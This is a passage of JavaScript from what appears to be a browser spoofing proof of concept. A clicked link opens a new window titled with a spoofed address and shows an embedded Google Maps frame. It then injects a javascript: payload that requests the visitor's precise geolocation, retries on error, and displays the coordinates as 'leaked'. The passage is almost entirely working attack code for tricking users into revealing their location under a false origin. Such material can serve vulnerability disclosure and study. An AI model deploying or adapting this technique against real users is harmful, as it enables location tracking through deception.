link.href = spoof;
link.onclick = function(e) {
	setTimeout(function(){

	var qwin = open("", "_blank", "");
    var qdoc = qwin.document;

    qdoc.head.innerHTML = `<title>${spoof}</title><meta name="viewport" content="width=device-width, initial-scale=1.0">`

    qiframe = document.createElement('iframe')
    qiframe.setAttribute('src', 'https://www.google.com/maps/embed?pb=!1m28!1m12!1m3!1d50440.015026354726!2d-122.4851991208114!3d37.801733917011646!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!4m13!3e6!4m5!1s0x808586deffffffc3%3A0xcded139783705509!2sGolden%20Gate%20Bridge%2C%20Golden%20Gate%20Bridge%2C%20San%20Francisco%2C%20California%2C%20Amerika%20Serikat!3m2!1d37.8199286!2d-122.4782551!4m5!1s0x80859a6d00690021%3A0x4a501367f076adff!2sSan%20Francisco%2C%20California%2C%20Amerika%20Serikat!3m2!1d37.7749295!2d-122.4194155!5e0!3m2!1sid!2sau!4v1605386906677!5m2!1sid!2sau')

    qdoc.body.appendChild(qiframe);

    var injectScript = `
        var options = {
            enableHighAccuracy: true,
            timeout: 5000,
            maximumAge: 0
        };

        function success(pos) {
            var crd = pos.coords;

        alert(\`Your current position has been leaked:\\n
        Latitude : \${crd.latitude}\\n
        Longitude: \${crd.longitude}\\n
        More or less \${crd.accuracy} meters.\`)
        }

        function error(err) {
            console.warn(\`ERROR(\${err.code}): \${err.message}\`);
            navigator.geolocation.getCurrentPosition(success,error,options);
        }

        navigator.geolocation.getCurrentPosition(success,error,options);
    `

    qembed = document.createElement('embed');
    qembed.setAttribute("src", `javascript:${injectScript.toString()}`)

    setTimeout(function(){
        qdoc.body.appendChild(qembed);
    }, 1200)
    
    }, 333);

return false;
}
</script>
